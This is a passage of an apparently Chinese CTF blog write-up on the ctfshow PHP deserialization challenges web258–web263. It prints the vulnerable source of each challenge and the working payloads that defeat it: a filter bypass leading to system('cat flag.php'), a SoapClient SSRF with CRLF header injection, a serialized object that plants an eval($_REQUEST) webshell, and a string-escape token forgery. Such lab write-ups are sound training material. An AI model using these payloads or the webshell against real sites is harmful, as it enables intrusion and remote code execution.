class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了 <code>O:数字:</code> <code>C:数字:</code> 的形式, 可以在数字前面加上 <code>+</code> 绕过</p><p>然后之前的 private 全部改成 public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = $<span class="hljs-title">class</span>;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backDoor</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$o</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=123&amp;password=123<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">user=O:+<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:+<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;system(&quot;</span>cat flag.php<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>然后url编码进行传入看源码</p><h2 id="web259"><a class="markdownIt-Anchor" href="#web259"></a> web259</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$vip</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br><span class="hljs-comment">//vip can get flag one key</span><br><span class="hljs-variable">$vip</span>-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xff</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br><span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现非预期好像没了，按正常的来吧，需要利用php的原生类，but我本地代码跑不了，可能是版本问题，直接上别人现成的payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A235%3A%22yn8rt%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;token=ctfshow&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;yn8rt^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;aaab&quot;</span>));<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web260"><a class="markdownIt-Anchor" href="#web260"></a> web260</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>])))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctfshow=ctfshow_i_love_36D<br></code></pre></td></tr></table></figure><p>？好像不应该出现在这里吧</p><h2 id="web261"><a class="markdownIt-Anchor" href="#web261"></a> web261</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;password!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-variable language_">$this</span>-&gt;username.<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>当 <code>__wakeup()</code> 和 <code>__unserialize()</code> 同时存在时, 仅会执行 <code>__unserialize()</code> 方法,<code>__invoke()</code> 当尝试将对象调用为函数时触发</p><p><code>0x36d</code>需要转化为十进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;877.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowvip</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?vip=O:10:<span class="hljs-string">&quot;ctfshowvip&quot;</span>:2:&#123;s:8:<span class="hljs-string">&quot;username&quot;</span>;s:7:<span class="hljs-string">&quot;877.php&quot;</span>;s:8:<span class="hljs-string">&quot;password&quot;</span>;s:27:<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>一句话木马之后rce就行</p><h2 id="web262"><a class="markdownIt-Anchor" href="#web262"></a> web262</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>/message.php</code>下面<code>cookie</code>传值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9<br></code></pre></td></tr></table></figure><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><p>字符串逃逸</p><p>需要确保token为admin</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>长度为27，通过<code>str_replace</code>可以增加一个字符来进行逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=orange&amp;m=orange&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web263"><a class="markdownIt-Anchor" href="#web263"></a> web263</h2><p>有一个前端页面，下载www.zip，定位到inc/inc.php 中的 User 类有一处<code> file_put_contents()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span 